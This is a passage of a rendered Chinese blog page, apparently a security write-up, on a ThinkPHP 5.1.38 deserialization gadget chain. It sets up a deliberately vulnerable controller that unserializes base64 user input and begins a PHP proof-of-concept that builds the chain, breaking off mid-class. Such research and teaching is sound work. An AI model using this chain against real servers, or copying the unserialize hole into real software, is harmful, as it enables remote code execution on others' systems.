@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Saofe1a">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/10/10/thinkphp5.1 反序列化ajax链/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="环境搭建composer create-project topthink&#x2F;think tp5.1.38 5.1.38 composer.json 12345&quot;require&quot;: &#123;    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,    &quot;topthink&#x2F;framework&quot;: &quot;5.1.38&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphp5.1 反序列化ajax链">
+<meta property="og:url" content="http://example.com/2024/10/10/Thinkphp5.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ajax%E9%93%BE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="环境搭建composer create-project topthink&#x2F;think tp5.1.38 5.1.38 composer.json 12345&quot;require&quot;: &#123;    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,    &quot;topthink&#x2F;framework&quot;: &quot;5.1.38&amp;qu">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-7118fdac3daa25fd4f0c349c8e92d275_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-73e9d0f6dd0766d7298ba103c488d402_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-697f224d7df0d29fd99982b6bc307eec_1440w.webp">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-c01e3acd4464aba1ec41d7daa1786cbb_1440w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-56fdc7eabfd8e4b8802af4376eeca7f8_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-f483e62604574c907efe5d70093d9698_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-ad6d22ac0ee8f11a2a41385aab32853e_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-0d71c219a11b71ebb17fa335a84de774_1440w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-aa025fcc6d67b5b177ef3245fd7ca69c_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-af522365c12af2de46c9cb7ea90197ea_1440w.webp">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-6c33495e0e39f9a44f5f883d15d6cf77_1440w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-03b1051c7b95e1771f52a49db544cdfe_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-ea57644726a551e7bd9704b6f4e3cda6_1440w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-1c0de983c1b42cfb884a07b84455dd30_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-2da4c237f6839ea8fe03adbcbcb7876a_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-13a303ddb2eee3f0cb3207176a196daa_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-cd6987ea8592a2344bdb2e0bd45ecc54_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-4646781a8d57236d5ecf1e86c30e3ae5_1440w.webp">
+<meta property="article:published_time" content="2024-10-10T03:39:55.490Z">
+<meta property="article:modified_time" content="2024-10-10T03:39:08.219Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picx.zhimg.com/80/v2-7118fdac3daa25fd4f0c349c8e92d275_1440w.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/chelsea.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/chelsea.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/chelsea.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Thinkphp5.1 反序列化ajax链 -
+        
+        Saofe1a
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Saofe1a","subtitle":{"text":["Better late than never","感谢所有在CTF道路上帮助过我的师傅们","Man proposes,God disposes"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"About":{"path":"/about/","icon":"fa-regular fa-user"},"Links":{"path":"/links/","icon":"fa-regular fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Saofe1a
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Saofe1a
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    LINKS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                LINKS
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Thinkphp5.1 反序列化ajax链</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/touxiang.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Saofe1a</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-10-10 11:39:55</span>
+        <span class="mobile">2024-10-10 11:39:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-10-10 11:39:08</span>
+            <span class="mobile">2024-10-10 11:39:08</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.3k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>9 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><code>composer create-project topthink/think tp5.1.38 5.1.38</code></p>
+<p>composer.json</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.38&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/think-captcha&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.*&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+<p>composer update</p>
+<p>该反序列化漏洞属于二次触发漏洞，需要有一个入口，因此我们将控制器中的Index控制器修改一下：<br><code>tp5.1.38\application\index\controller</code></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ThinkPHP5_Unserialize:\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP5&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>public文件夹下的index.php文件加两句话</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Container</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;app&#x27;</span>)-&gt;<span class="title function_ invoke__">run</span>()-&gt;<span class="title function_ invoke__">send</span>();</span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure></div>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>先跑脚本得到payload调试走一遍，看完文章的分析后再回来细想</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123; //这种很多文件的，记得加上命名空间  </span><br><span class="line">  </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>; <span class="comment">//需要用到什么，需要用use来引入  </span></span><br><span class="line">  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span>  </span></span><br><span class="line"><span class="class">    </span>&#123;  </span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];  </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="keyword">new</span> <span class="title class_">Pivot</span>(); <span class="comment">//反序列化入口，控制filename  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;  </span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];  </span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];  </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data=<span class="keyword">array</span>(  </span><br><span class="line">              <span class="string">&#x27;a&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()   <span class="comment">//这是用来控制relation的，连接第二阶段  </span></span><br><span class="line">            );  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=<span class="keyword">array</span>(  </span><br><span class="line">              <span class="string">&#x27;a&#x27;</span>=&gt;<span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span> <span class="comment">//这是用来控制name的，其实根本没用，因为我们并没有用到visible这个函数，所以只需要key一样即可，至于value是什么不重要  </span></span><br><span class="line">                )  </span><br><span class="line">            );  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span> //这是用来在<span class="title">poc</span>中生成<span class="title">payload</span>的  </span></span><br><span class="line"><span class="class">    </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123; //前面是第一阶段，这里开始时第二阶段的控制  </span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">hook</span> = [];  </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [  </span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量  </span></span><br><span class="line">        